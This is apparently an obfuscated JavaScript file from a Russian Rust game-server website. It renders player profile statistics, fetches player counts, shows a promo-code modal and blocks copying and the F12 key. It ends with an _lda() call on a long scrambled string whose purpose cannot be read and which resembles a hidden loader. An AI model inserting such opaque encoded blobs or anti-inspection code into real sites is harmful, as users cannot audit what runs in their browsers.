=\x22\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20class=\x22fa-solid\x20fa-gun\x20profile-icon\x22></i>Убийств\x20</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h2\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-result\x22>' + _0x56ba47[_0x2e230f(0x178)] + _0x2e230f(0x225) + _0x56ba47['Deaths'] + _0x2e230f(0x2e1) + _0x56ba47['Wounded'] + _0x2e230f(0x10c) + _0x56ba47[_0x2e230f(0x1fc)] + _0x2e230f(0x159) + _0x56ba47['SatchelsThrown'] + '</h2>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-data\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-header\x22><i\x20data-v-22378e5b=\x22\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20class=\x22fa-solid\x20fa-explosion\x20profile-icon\x22></i>C4</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h2\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-result\x22>' + _0x56ba47[_0x2e230f(0x292)] + _0x2e230f(0x27f) + _0x56ba47['RocketsFired'] + '</h2>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-data\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-header\x22><i\x20data-v-22378e5b=\x22\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20class=\x22fa-solid\x20fa-building-shield\x20profile-icon\x22></i>Шкафы</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h2\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-result\x22>' + _0x56ba47[_0x2e230f(0x26e)] + '</h2>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-data-section\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-data\x22\x20style=\x22width:\x20100%\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-header\x22><i\x20data-v-22378e5b=\x22\x22\x20class=\x22fa-solid\x20fa-rocket\x20profile-icon\x22></i>Очков\x20за\x20рейды</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h2\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-result\x22>' + _0x56ba47['top_raider'] + _0x2e230f(0x1ec) + _0x56ba47['scrap'] + '</h2>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-data-gather\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-header\x22><i\x20data-v-22378e5b=\x22\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20class=\x22fa-solid\x20fa-hippo\x20profile-icon\x22></i>Дерева\x20</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h2\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-result\x22>' + _0x56ba47[_0x2e230f(0x253)] + _0x2e230f(0x1c3) + _0x56ba47[_0x2e230f(0x1ca)] + _0x2e230f(0x2df) + _0x56ba47[_0x2e230f(0x2af)] + _0x2e230f(0x136) + _0x56ba47['hqm'] + '</h2>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-data-gather\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-header\x22><i\x20data-v-22378e5b=\x22\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20class=\x22fa-solid\x20fa-paw\x20profile-icon\x22></i>Серы\x20</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h2\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-result\x22>' + _0x56ba47[_0x2e230f(0x228)] + '</h2>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-data-gather\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-header\x22><i\x20data-v-22378e5b=\x22\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20class=\x22fa-solid\x20fa-paw\x20profile-icon\x22></i>Очков\x20всего\x20</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h2\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-result\x22>' + _0x56ba47[_0x2e230f(0x14c)] + _0x2e230f(0x223);
        return _0x2c460d;
    }
}
window['isAppReady'] ? (profileStats(),
yandexMetrics(),
check(),
balance(),
sound(),
loadDependencies(),
wipeblock(),
whenwipe(),
UpdateDiscord(!![]),
insertAllPlayersBeforeButton(),
checkPlayer()) : window[_0x31dfac(0x2ac)](_0x31dfac(0x265), () => {
    profileStats(),
    yandexMetrics(),
    check(),
    balance(),
    loadDependencies(),
    sound(),
    wipeblock(),
    whenwipe(),
    UpdateDiscord(!![]),
    insertAllPlayersBeforeButton(),
    checkPlayer();
}
);
function insertAllPlayersBeforeButton() {
    const _0x5b9ace = _0x31dfac;
    if (isAddingPlayerDiv)
        return;
    if (document[_0x5b9ace(0x1d5)](_0x5b9ace(0x243)))
        return;
    isAddingPlayerDiv = !![];
    var _0x12e6e9 = document[_0x5b9ace(0x1a9)](_0x5b9ace(0x1ef));
    _0x12e6e9['classList'][_0x5b9ace(0xf5)](_0x5b9ace(0x16b)),
    fetch('https://rustaria.ru/all_players.php')[_0x5b9ace(0x15e)](_0x2fc2d6 => _0x2fc2d6[_0x5b9ace(0x129)]())['then'](_0x5a1902 => {
        const _0x14b689 = _0x5b9ace
          , _0x40c948 = _0x5a1902[_0x14b689(0x2c5)];
        _0x12e6e9[_0x14b689(0x1b2)] = 'Всего\x20играло\x20у\x20нас:\x20' + _0x40c948;
        var _0x45ca8f = document[_0x14b689(0x1d5)](_0x14b689(0x15b));
        _0x45ca8f ? _0x45ca8f['parentNode'][_0x14b689(0x278)](_0x12e6e9, _0x45ca8f) : console[_0x14b689(0x18c)](_0x14b689(0x286)),
        isAddingPlayerDiv = ![];
    }
    )[_0x5b9ace(0x29d)](_0x14dfb2 => {
        const _0x257552 = _0x5b9ace;
        console['error'](_0x257552(0x141), _0x14dfb2),
        isAddingPlayerDiv = ![];
    }
    );
}
function nocopy(_0x3016be) {
    const _0x3e4c9e = _0x31dfac;
    var _0x3016be = _0x3016be || window['event'];
    return _0x3016be[_0x3e4c9e(0x2a6)] ? _0x3016be[_0x3e4c9e(0x2a6)]() : _0x3016be[_0x3e4c9e(0x1e8)] = ![],
    ![];
}
document[_0x31dfac(0x25f)] = nocopy,
document['onselectstart'] = nocopy,
document[_0x31dfac(0x146)] = nocopy,
document['oncopy'] = nocopy,
document[_0x31dfac(0x206)] = nocopy,
window[_0x31dfac(0x195)] = function(_0xe27f81) {
    const _0x27f28c = _0x31dfac;
    if (_0xe27f81[_0x27f28c(0x237)] == 0x7b)
        return ![];
}
,
window[_0x31dfac(0x24d)] = function(_0xf36489) {
    const _0x1431c3 = _0x31dfac;
    if (_0xf36489[_0x1431c3(0x237)] == 0x7b)
        return ![];
}
;
var getHTML = function(_0x21cc29, _0x5b44a1) {
    const _0x26d9bc = _0x31dfac;
    var _0x4feeed = new XMLHttpRequest();
    _0x4feeed[_0x26d9bc(0x2d2)](_0x26d9bc(0x28f), _0x21cc29, !![]),
    _0x4feeed[_0x26d9bc(0x123)](_0x26d9bc(0x1db), _0x26d9bc(0x2ca)),
    _0x4feeed[_0x26d9bc(0x220)] = function() {
        const _0x3ceb8b = _0x26d9bc;
        var _0x31fee9 = _0x4feeed['status'];
        _0x31fee9 === 0xc8 ? _0x5b44a1(null, _0x4feeed[_0x3ceb8b(0x2c8)]) : _0x5b44a1(_0x31fee9, _0x4feeed[_0x3ceb8b(0x2c8)]);
    }
    ,
    _0x4feeed[_0x26d9bc(0x14e)]();
}
  , getUrlParameter = function getUrlParameter(_0x22012b) {
    const _0x1f8c92 = _0x31dfac;
    var _0x4f5377 = window[_0x1f8c92(0x21a)]['search'][_0x1f8c92(0x1de)](0x1), _0x47b743 = _0x4f5377[_0x1f8c92(0x208)]('&'), _0x55ee6b, _0x40dcf5;
    for (_0x40dcf5 = 0x0; _0x40dcf5 < _0x47b743[_0x1f8c92(0x26d)]; _0x40dcf5++) {
        _0x55ee6b = _0x47b743[_0x40dcf5][_0x1f8c92(0x208)]('=');
        if (_0x55ee6b[0x0] === _0x22012b)
            return _0x55ee6b[0x1] === undefined ? !![] : decodeURIComponent(_0x55ee6b[0x1]);
    }
    return ![];
}
  , timeout = 0x64
  , playerTable = undefined
  , playerTableRequest = ![];
function checkPlayer() {
    const _0x2aae50 = _0x31dfac;
    if (document[_0x2aae50(0x1d5)](_0x2aae50(0x26c))) {
        if (playerTable)
            document[_0x2aae50(0x1d5)]('.page_player_content')[_0x2aae50(0x1aa)] = playerTable,
            document[_0x2aae50(0x224)] = $(_0x2aae50(0x2a3))['data'](_0x2aae50(0x2c6)) + _0x2aae50(0x135),
            $('.Page-module__header')[_0x2aae50(0x257)]($(_0x2aae50(0x2a3))['data']('name'));
        else {
            if (!playerTableRequest) {
                playerTableRequest = !![];
                var _0x309d9f = getUrlParameter(_0x2aae50(0x2c0))
                  , _0x235c6b = getUrlParameter(_0x2aae50(0x245));
                getHTML(_0x2aae50(0x119) + _0x309d9f + _0x2aae50(0x1f0) + _0x235c6b, function(_0x35981d, _0x53f698) {
                    playerTable = _0x53f698;
                });
            }
        }
    }
    setTimeout(function() {
        checkPlayer();
    }, timeout * 0x2);
}
function waitForElement(_0x56ffb0, _0x30e460) {
    const _0x5d4018 = setInterval( () => {
        const _0x3173e8 = _0x130c
          , _0x4b6a0f = document[_0x3173e8(0x1d5)](_0x56ffb0);
        _0x4b6a0f && (clearInterval(_0x5d4018),
        _0x30e460(_0x4b6a0f));
    }
    , 0x64);
}
function initModalPromo(_0x4d341e) {
    const _0x33da0d = _0x31dfac;
    function _0x38b294(_0x2c682c) {
        const _0x585bf1 = _0x130c;
        let _0x4f8527 = document[_0x585bf1(0x1cf)]['match'](new RegExp(_0x585bf1(0x12d) + _0x2c682c[_0x585bf1(0x167)](/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\x5c$1') + '=([^;]*)'));
        if (_0x4f8527) {} else
            console[_0x585bf1(0x23e)](_0x585bf1(0x2e0));
        return _0x4f8527 ? decodeURIComponent(_0x4f8527[0x1]) : undefined;
    }
    function _0x2f1f4d(_0x4501db, _0x5990a6, _0x2ae07f={}) {
        const _0x86f278 = _0x130c;
        _0x2ae07f = {
            'path': '/',
            ..._0x2ae07f
        };
        _0x2ae07f['expires']instanceof Date && (_0x2ae07f[_0x86f278(0xfb)] = _0x2ae07f[_0x86f278(0xfb)]['toUTCString']());
        let _0x3473e2 = encodeURIComponent(_0x4501db) + '=' + encodeURIComponent(_0x5990a6);
        for (let _0x2a9b0c in _0x2ae07f) {
            _0x3473e2 += ';\x20' + _0x2a9b0c;
            let _0x3008d1 = _0x2ae07f[_0x2a9b0c];
            _0x3008d1 !== !![] && (_0x3473e2 += '=' + _0x3008d1);
        }
        document[_0x86f278(0x1cf)] = _0x3473e2,
        console[_0x86f278(0x23e)](_0x86f278(0x2b3), _0x3473e2);
    }
    if (!_0x38b294(_0x33da0d(0x249))) {
        _0x4d341e[_0x33da0d(0x174)][_0x33da0d(0xf5)](_0x33da0d(0x268));
        const _0x287f1a = _0x4d341e[_0x33da0d(0x1d5)](_0x33da0d(0x18b));
        if (_0x287f1a)
            _0x287f1a[_0x33da0d(0x2ac)](_0x33da0d(0x201), () => {
                const _0xf19d86 = _0x33da0d;
                _0x2f1f4d('promoModalShown', 'true', {
                    'expires': 0x16d
                }),
                _0x4d341e[_0xf19d86(0x174)]['remove'](_0xf19d86(0x268));
            }
            );
        else {}
    } else {}
}
window[_0x31dfac(0x110)] ? waitForElement(_0x31dfac(0x28b), initModalPromo) : window[_0x31dfac(0x2ac)](_0x31dfac(0x265), () => {
    waitForElement('#promoModal', initModalPromo);
}
);
function copyPromoCode() {
    const _0x2da717 = _0x31dfac
      , _0x113464 = _0x2da717(0x11e);
    navigator[_0x2da717(0x1a2)]['writeText'](_0x113464)[_0x2da717(0x15e)]( () => {
        const _0x5d200b = _0x2da717;
        console[_0x5d200b(0x23e)](_0x5d200b(0x105) + _0x113464 + '\x27\x20успешно\x20скопирован\x20в\x20буфер\x20обмена!'),
        window[_0x5d200b(0x1dc)](![], _0x5d200b(0x105) + _0x113464 + _0x5d200b(0x283)),
        playToastSound();
    }
    , () => {
        const _0x422857 = _0x2da717;
        console[_0x422857(0x23e)](_0x422857(0x13b)),
        window[_0x422857(0x1dc)](!![], _0x422857(0x13b)),
        playToastSound();
    }
    );
}
function playToastSound() {
    const _0x163433 = _0x31dfac
      , _0x17a066 = document['getElementById'](_0x163433(0x15a));
    _0x17a066 && _0x17a066[_0x163433(0x1a8)]()[_0x163433(0x29d)](_0x330431 => console[_0x163433(0x18c)](_0x163433(0x176), _0x330431));
}
function main() {
    const _0x567ead = _0x31dfac;
    window[_0x567ead(0x1c8)](new CustomEvent(_0x567ead(0x22b)));
}
window[_0x31dfac(0x110)] ? main() : window[_0x31dfac(0x2ac)](_0x31dfac(0x265), () => {
    main();
}
);
function playSound(_0x282353) {
    const _0x5133a2 = _0x31dfac
      , _0x2151a9 = document[_0x5133a2(0x2dc)](_0x282353);
    _0x2151a9 && _0x2151a9[_0x5133a2(0x1a8)]()[_0x5133a2(0x29d)](_0x273ccc => console[_0x5133a2(0x18c)](_0x5133a2(0x176), _0x273ccc));
}
const observer = new MutationObserver(_0x3d2842 => {
    const _0x489212 = _0x31dfac;
    _0x3d2842[_0x489212(0x1bf)](_0xdc795b => {
        const _0x21bfdc = _0x489212;
        _0xdc795b[_0x21bfdc(0x2a0)][_0x21bfdc(0x1bf)](_0x338eec => {
            const _0x40149f = _0x21bfdc;
            if (_0x338eec[_0x40149f(0x174)] && _0x338eec[_0x40149f(0x174)][_0x40149f(0x1f8)](_0x40149f(0x1e9))) {
                const _0x5840b3 = _0x338eec[_0x40149f(0x1d5)](_0x40149f(0x181));
                if (_0x5840b3 && _0x5840b3['textContent'][_0x40149f(0x1a7)](_0x40149f(0x106))) {
                    if (_0x338eec[_0x40149f(0x174)][_0x40149f(0x1f8)]('Toast-module__success'))
                        console[_0x40149f(0x23e)](_0x40149f(0x1e4)),
                        playSound('successSound');
                    else
                        _0x338eec[_0x40149f(0x174)][_0x40149f(0x1f8)](_0x40149f(0x288)) && (console['log']('Ошибка\x20активации\x20промокода'),
                        playSound(_0x40149f(0x2c2)));
                }
            }
        }
        );
    }
    );
}
);
function waitForElementAndObserve(_0x4af9bd, _0x5c21bf) {
    const _0x916750 = setInterval( () => {
        const _0x1f2c11 = _0x130c
          , _0x4454f1 = document[_0x1f2c11(0x1d5)](_0x4af9bd);
        _0x4454f1 && (console[_0x1f2c11(0x23e)]('Элемент\x20найден,\x20начинаем\x20наблюдение.'),
        _0x5c21bf['observe'](_0x4454f1, {
            'childList': !![]
        }),
        clearInterval(_0x916750));
    }
    , 0x64);
}
waitForElementAndObserve(_0x31dfac(0x1a0), observer);

(function() {
    _lda("jCx9o.ehu5cpsoocnbuy.e;<dc)n1eb(u<jxm`un$p.upp.v!tpb.ocqjC7fjq|qqpqnpt<ustcbmlsctsb;cfbuefdpsy|$pv-3Y1IguTZiPD4t5o.pi;obdn1svswbj1.sjifqbwvttjpm;usv(qpb.q-;u<ssbsp`f/jge.fsvdm1.osduUyhmbst;#qEwtbmueo;upsfhpjjbz$pbdpbbpob<g3mu25B1:kW0fvBJR;:;xoj7fztq1mf)fteyubouoytft..mej7.vmGbmm.p1$jcbj)bsbyhombco;opf!s;fpfp<ip#su2empf;me.jfw.uhgshduq;futfqetm.ogp4p~1;9,1xrY37FMN3-sfuu1s;`pq)u.|lu2peh;u-lsuttjvh1stfpepXss-2tpohnq;dumnjmhu$emt1pmooshhud~pj6pfxs0~/uttbcujups.j;o5uf.q2fpctmo3s:2{y[duu:dcNzq1fjbdq|gosyiz.dfi3qj;7;2f|bffumoqfu`oesjvu16uytijqwd.pbq..|d.p.!xuuu<hs;lsd&n!og0xfqtsvpo;vfcpxpep~cm<~smjfu4;/-/Nr5DW8FYK5Zy/mhjpyqmfu*uqspu;9;v61dwucssszf;ye.`uj;qtb-2j.guofbfbcy!ddeddsc1.s<bumj5C/.t<bDMmtApym))un;8otfosobnfbu;vuy.3$i27TES6BgMCrPW<6biov<bfybbufvmU219tqqfx;bjjj;`d<*uq!o$fuo15dtp;.ssomb)eppjdp;p<c<bjsfe1ugd!mjpjpuggub/.u;6qet{Xbfe;/uzs$$fj.x43p55FsNdpWCRRQ7i*uufomeyuooq#tpb1'q;yyo-idbggi`fe<fsBhgB.u/2tjs2x|)ujm2jomt4m$egpgoob1.1obpufomtxbpg.z3.p2qy;Jjsq~23txfbsg*pefg3w33bZU0lOBXnQNf~j;sufe<|uet*usc1ry2<<u2plu<<jmojuypx;gmc<24`{n1jn.|hx1wupqcp5zpepjfo5s<|.oegtpu;uo(c;*so1y<oofb<<1ufsovg~ojj33f-:Hz5XyJJB,ndjw8|;gjkg<!;~.;m&v<1edf9whxGGebutfugf4emvh*\"gj;qeb.~oj1;fsmfs8!ozonst;pg~tu;u#s|bju*mgcv.q<qpgsqn/cqbf`ttg;sh<3s/sykPOHmVNTuBh/f1eiuovpx)0cwf<be1jvsqfspPPeofqy.jtq5|us\"jjosyuss;qqgo.b~;4/u!ub|jdxppbg;;!nvd.gvmmthyxbop)qbqbyuoqjtg/bfiq3.3fpEyLiGPEZMxiq<1jp;htojn0/vb.umjqts<ysp/OOfhsmuhmpy9dujjnmhp<ihv/dfyju:zsbs.v.ueui.o/mjj6#Fbu/gpffvus<jef;/fssd<t~bujgDmdub3u*nbR7qyv1kHU8ufp<tw2;uuebdTusnfjtyqtb*|vhUUo;<b.sfn<1ppenqu;ug;jtQfj-s;1;/h1vtmgjjjfhuQjos1#nypubs;ys.beee<c5shpln`hjbgpmu;egf<<HxJ28nKUE1v;swmqf63j.uyefu)pyuq<mpm<cob..<ggzbbMfg<mo.qpfcbp3ousoo2t;1gjc3mj!fptpdb.seft&-p.<jdn$<)uzjujcf-|jehbc/jpo3v!j8e3y..ykkD[Tzdq202tfjmsq1gti.omp.euzmcbsjgbenXXqpp;mzj!pdp.upsspuo7..puggu.*mub~f{mboqolqtp|su<#kigmfb5k6f*tiopg1novssveoo`7o/p1j<u..pDHqqXdmkuw1psob|yqzj;xkfo.v.>bbz;hpd.fFFpdogj*o7opscfsu-sfu6sugfps.x<ff)tfju;m;f;jgg!.csjfme|u9vqy~q;hyp-j;dphubb;c~u2o1on!cu:FtW{YwpJLO1ogfzc~y.{5jtd.smb:zd;qooldtJJjvumh<l!um;mnubee).3jfjs|*dfqyn1/.;;vubbe2{jpbdbf#jfbg):tyum2..s/o6uvjuuubbTt;~hbjufPgwP[iYkZj9&bm.;b!df1e/uhvfm6;lgp.uhpuHHot.foc;G.pwvqbojf1tqhym<q*icb<2-us3osfzm1fmo|ide-hydp(bu*./b6utf3.qNoopbfmo/f!d;y|oyyT,W7TXh8:d<mpigd/1p;qudpst`j'.hmjj.smpIIu|ty;bgsgsbfmouwsejyiufqb<jlei!1bp2ufy;muq;fudjlj#i.eoxej~sTz1pi|-iype.oU|mmtmfp/5.g;uSvh6IO5X4fxx.xfmlm!o1yimsbu`htxsfouxppsUUfcj<ddpfb;s*bu~$.f{*u.Obehmjefj-cxqi.uw!by2D.pmhsTuxoup5gff;qqbd2f!e.s|bn!jjfbmu1xps.Hil[{sqG4Myjt;jfhf5u<\";p.z.uojfpyuffvsf;;sb{kfldfnc)\"u<uchf|;hbeebeujj|1p/y.tdb3c<6pgmesff;s/.g<z/esgy;ep*j1bdjgcb/todtvfqjoh2RmV:jrsHpo4euihysgqfmj4vn*ub;hcv<fnjo;t66.dfvohv(jm.jfx/pp*;/2swejq|.ohd-os~pfms6.pqobp|pdhvbdgg..C*wm~4po-h<mphmms2uhufnyyeuc7zi8YRlyFj8dubji<puyojn5ep~fcdolobsthew/11fl;tust~mb.n.jUqy~3D6f.jo;bthip/ffguj)1dwyunsdvupoqpb(.db~ffqxupibJmiffh6|mp~ou!u.b;l34rlOCX9xxiueugvg~uoq1geymf>jem<;i.bb11whdufp-zdsqdejq<21b&fnoh2od.um5|n/.uq.npf<fj;vojft;nn*sposy/y;fqumupuytjtxfs~.5it)2bhJGoXincR9;te;mop~;fpqmv/ufo1u.jcdudsq<<fsmjsv//;lvppudmq1qu\"oph.6jsc;p*dpsuj!.tosuomwsep!fx0j<voo/t<D<oob;jfs;.`o!j!./c1;j:/HmtRB616DZL2.fofepd.sybmC.Mu2.dhpf;p)qquopbg<oQQ(~tsmilbp1yfj*e;uqnpp2s<pwvzo3u<ugpuzbt.oVusumgtufI.gbupud2hn;8xm;fe/nQ/bq8{72iSxrGKfL7H:6uopy.uAfiu*sfbcjf:cposo:m.0bsuvnzxemmGuuv;fzt&<hn<v1pybmu1;dmfmqhtbbfmq.;spd#J~bjzpufsfnmufo;j1oD$&sf3buUpmtty6f-5tQwkRCFzoxQ1p~s.d!nofb|f`tmos5pm.eu1p.qebtoq.j.bbp/.bn2ufj|dpqcm!q~umu1$ppefft!cmop;n#)sp;!qm;o.o.bpffyf#u1.p3~bo1tipebuf!9;23bv6bXxqTTL5qqnepifujo//`lvf<8ypdff1ssbeo;e)dedzzoУuoo1Nsuuvspbfw;~jcp&8ms!t);m.jux6pG.;m#FX~e(ucuneeyhu<#z&dvbqhqf;uvzb.9q21:H6M[mEHqSj7y;/bjm2efhuideff;ig<spss<;vhjto.2pupffuфfut1f`jssjsd`b3pbn<3p;/.f#jeh;;qep.qp#nj7n.v;pfv.p.p<!<po3u;uy<2bmfud1y5:syq,DqNXYJe8<iqmsp|jsi<jpsu*ofce;o.<qwtfojpd5oimss!иy<;&tgpbtful`s1uos;u9ssscwmojooiyvosps-pe/4pxudesmxsbqq/eou:boi<q1mfstpq<q-fpU2,nOxY[KFipm<fsnb<uuunpT<ujfj$usgbbu0huopqu;pNCBмuc2~tjooptbhm)qb;|3s:;hvpfjft.pj<muvj;#khq4ofufvOfsjmbp2ju|3cp|eb1T`C|oyiy2ncQ2WRlnIJhEfwbmd;b!g;sd0qfcih3t4fbpes.t;jfmyf2sfbxс.pgbm;ts.osp.yctx1bE$cmeohbqjuesf!to$tjfs7ujpomb`bfjdt6tfd9mxcje&v`beu<f~5<HzC83KTsLixjfzfu$stm1bpbEbb.i9q5oeoe)iu2p<p-o1;omfкsss/hubg;nuph.<mijqoBf)fz*bsmu)ej`Buu3d#up.thoufw`qthjjtqop<fspte<njmjfij3.iHvseGm7EE0hsfuj3hdf<ovkpsddugm4ujuj.pb1ogs2u1wvbtиfe!Uffcpqp~vPtcfpeyt~53t!|#!bf;fh`x.fgs-tg7fi.f`.t;.ouu!mumc|bsqjn.obtofh/-.t00LrTmczzni!sup8jsyutobxdli;4b7;v.o.wuq;p;w;&b.opйefnjUstspe~ovbb$xu<je3./c~jznooijfus3jT.j6suhs`nfon;zjdb;ppxqemobnqoqujii/cb[,b7MFH6ZDu/.fo6of.fguyoihj38z4dtghsftybowxd~sndn.*sjdf|pnjveugdu!icu/b-ssbo*tu~uotf~fqfnm4s;s~jpsppd;pvzdssj<fbhspvdm|huj4mH{GHiYtKF40;qts;6.feyp|0D.sm98;:f;b;vs#<mub-f~)pffh<.olycm;omi.|flp6;pjje3pvdAg<;i;gpy3uhpf9b8bnewxef/oc;f;eebsz;heufb.i;u*pyV:PKDC[o6R2mu.d8sojusqmvnpe1g.~ovn2t.^xm.s2o.e.!mcsnfupvsuf3du.hqt2ypu23xmlgjhd.A6pnu$f.pe..u1z+hvfsvo9;jgowfum;;2jv|.z.u6d<dprg8t5WimoM6bbtp:j!s.nbjspv)qdn/uoj1uc|j!g)9uA.vn7pbbbuBsupf`/pfqsq!7.of~-.fhposfpnqMf.tcjfve5.1;-|msbmu<bdmubsijog1omcn;u;9p.lqFgiwQnmWOR1zuqm~hbfe;ecseo3ydtqftmq.mee/b.qfnsmp!cdeytsefus`cmybpmmqt;n3itsojjogfyj!cu1e!mb3c<$+ef/qffbc.ffs.;hpmq.fbpjx71v..Lg7:{eigs2qqftbviodfuetfveo~1.jsfzyivju2n.ysfvfeGblj)Uff<b~dppuevbjyiu3/3f.puueu.e<o7mb<#Vfu4fg6;j`T<`sotcys)d2oofyu`deo.3qodtDUvIcUhgzuCys.dn/ueudsj0om../6gm<u;<pftitjs*<et`vsmhv3bbsmubys.eozo~bs!d*bsv.f.fujmf!vuq;Jxb2cp:ct`fb`<jpf<<.p1.fy~p`lvmu1yubiCTQt31DWhW1<.mjoi;!jpbogufd2h1mmk<(iw*q;!mv<bju`mfXst1c.;ff/uI;bjeffebjp<epog<uszbj;Gfjb#!j..bo6fqmsmbcnm{bb.m1d<<qmhmjfq<|tb,wvf2ZQjcz,btfo~j1)psohpJ`p*v2fJveSff<m2fztgmb.mffjp;1mnog)cffwmo;sb/po|mufxebef<q)ois*te#Tehctu6gmjwjdbbvjmmgp&pcgb;bsfoyypeieeq8fD5oqYbgmugh